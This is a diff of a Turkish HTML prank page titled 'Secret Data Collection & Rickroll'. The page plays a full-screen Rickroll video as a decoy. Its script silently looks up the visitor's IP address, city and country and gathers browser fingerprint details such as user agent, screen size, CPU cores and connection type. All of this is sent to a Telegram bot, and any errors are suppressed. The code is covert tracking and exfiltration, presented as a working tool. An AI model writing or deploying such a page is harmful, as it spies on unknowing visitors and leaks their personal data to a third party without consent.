@@ -2,38 +2,37 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
-  <title>Gizli Veri Toplama</title>
+  <title>Gizli Veri Toplama & Rickroll</title>
   <style>
-    /* Sayfa tamamen görünmez ama video gösterilecek */
+    /* Sayfa tam ekran, Rick video arka plan */
     html, body {
-      margin: 0; padding: 0; width: 100vw; height: 100vh; overflow: hidden;
-      background: #000; /* siyah arka plan */
+      margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;
+      background: black;
       display: flex;
       justify-content: center;
       align-items: center;
     }
-    #rickVideo {
+    #rickrollVideo {
       position: fixed;
-      bottom: 10px;
-      right: 10px;
-      width: 200px;
-      height: 112px; /* 16:9 oranı */
-      opacity: 0.3;
-      pointer-events: none; /* Videoya tıklanmasın */
-      border-radius: 8px;
-      box-shadow: 0 0 15px #00ff99;
-      z-index: 9999;
+      top: 0; left: 0; width: 100%; height: 100%;
+      object-fit: cover;
+      z-index: 0;
+      pointer-events: none;
+    }
+    #overlay {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.3);
+      z-index: 1;
     }
   </style>
 </head>
 <body>
-  <iframe
-    id="rickVideo"
-    src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ&controls=0&showinfo=0&rel=0"
-    frameborder="0"
-    allow="autoplay; encrypted-media"
-    allowfullscreen
-  ></iframe>
+  <video id="rickrollVideo" autoplay muted loop>
+    <source src="https://cdn.pixabay.com/vimeo/592142858/Rickroll.mp4" type="video/mp4" />
+    Tarayıcınız video etiketini desteklemiyor.
+  </video>
+  <div id="overlay"></div>
 
   <script>
     async function sendToTelegram(message) {
@@ -51,7 +50,7 @@
           })
         });
       } catch(e) {
-        // Hata varsa sessizce geç
+        // Hata sessiz geç
       }
     }
 
@@ -60,27 +59,31 @@
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
 
-        const message =
-          `Gizli Veri Toplama:\n` +
+        const cores = navigator.hardwareConcurrency || 'Bilinmiyor';
+        const pixelRatio = window.devicePixelRatio || 1;
+        const timezoneOffset = -new Date().getTimezoneOffset() / 60;
+        const language = navigator.language || 'Bilinmiyor';
+        const platform = navigator.platform || 'Bilinmiyor';
+        const cookiesEnabled = navigator.cookieEnabled ? 'Aktif' : 'Kapalı';
+        const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor';
+
+        const message = `Gizli Veri Toplama:\n` +
           `IP: ${data.ip}\n` +
           `Şehir: ${data.city}\n` +
           `Ülke: ${data.country_name}\n` +
           `Tarayıcı: ${navigator.userAgent}\n` +
-          `Dil: ${navigator.language}\n` +
-          `Çözünürlük: ${screen.width}x${screen.height}\n` +
-          `Platform: ${navigator.platform}\n` +
-          `Zaman Dilimi (UTC): ${-new Date().getTimezoneOffset() / 60}\n` +
-          `Çerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
-          `CPU Çekirdeği: ${navigator.hardwareConcurrency || 'Bilinmiyor'}\n` +
-          `RAM (GB): ${navigator.deviceMemory || 'Bilinmiyor'}\n` +
-          `Bağlantı Tipi: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}\n` +
-          `İndirme Hızı: ${navigator.connection && navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'Bilinmiyor'}\n` +
-          `Gecikme (RTT): ${navigator.connection && navigator.connection.rtt ? navigator.connection.rtt + ' ms' : 'Bilinmiyor'}\n` +
-          `Veri Tasarrufu: ${navigator.connection && navigator.connection.saveData ? 'Açık' : 'Kapalı'}`;
+          `Ekran Çözünürlüğü: ${screen.width}x${screen.height}\n` +
+          `Piksel Yoğunluğu: ${pixelRatio}\n` +
+          `CPU Çekirdeği: ${cores}\n` +
+          `Dil: ${language}\n` +
+          `Platform: ${platform}\n` +
+          `Zaman Dilimi: UTC${timezoneOffset}\n` +
+          `Çerez İzinleri: ${cookiesEnabled}\n` +
+          `Bağlantı Tipi: ${connectionType}`;
 
         await sendToTelegram(message);
       } catch(e) {
-        // Sessizce hatayı yoksay
+        // Hata sessiz geç
       }
     }
 
